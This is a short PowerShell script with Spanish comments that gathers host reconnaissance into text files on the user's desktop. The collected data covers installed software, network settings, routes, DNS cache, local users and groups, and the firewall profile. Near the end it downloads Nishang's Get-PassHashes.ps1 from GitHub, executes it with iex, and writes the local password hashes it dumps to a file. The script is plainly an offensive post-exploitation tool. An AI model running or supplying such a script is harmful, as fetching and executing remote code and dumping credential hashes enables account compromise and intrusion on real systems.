function Info-Pc
{

 Param (
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $privilegiado,

        [Switch]
        $SAM
    )

   

    $ruta="c:\users\$env:UserName\Desktop\"
    #Archivo 1
    Get-WmiObject -Class Win32_Product > ($ruta+"aplicaciones.txt")
     #Archivo 2
     ipconfig > ($ruta+"red.txt")
     netsh int ip show int >> ($ruta+"red.txt")
     netsh int ip show route >> ($ruta+"red.txt")
 Get-NetRoute >> ($ruta+"red.txt")
 Get-DnsClientCache >> ($ruta+"red.txt")
 #Archivo 3
 net user > ($ruta+"users.txt")
 net localgroup >> ($ruta+"users.txt")
 Get-WmiObject win32_useraccount >> ($ruta+"users.txt")
 # Archivo 4 
 $user=whoami 
  $usuario=$user.split("\")[1]
  $salida=Get-WmiObject win32_useraccount | Where-Object {$_.name -eq $usuario}
 echo $salida > ($ruta+"usuarioActual.txt")
 # Archivo 5
netsh advfirewall show currentprofile  > ($ruta+"firewall.txt")

# Archivo 6
 if ($privilegiado -eq "si" -and $SAM)
    {
    echo "Si Estas usando en entorno privilegiado se volcaran los hashes"
     iex (New-Object net.webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1')
    sleep 3
    Get-PassHashes > ($ruta+"Hashs.txt")
    } 
    
    echo "Tienes Los archivos en el escritorio del usuario actual"
    

}
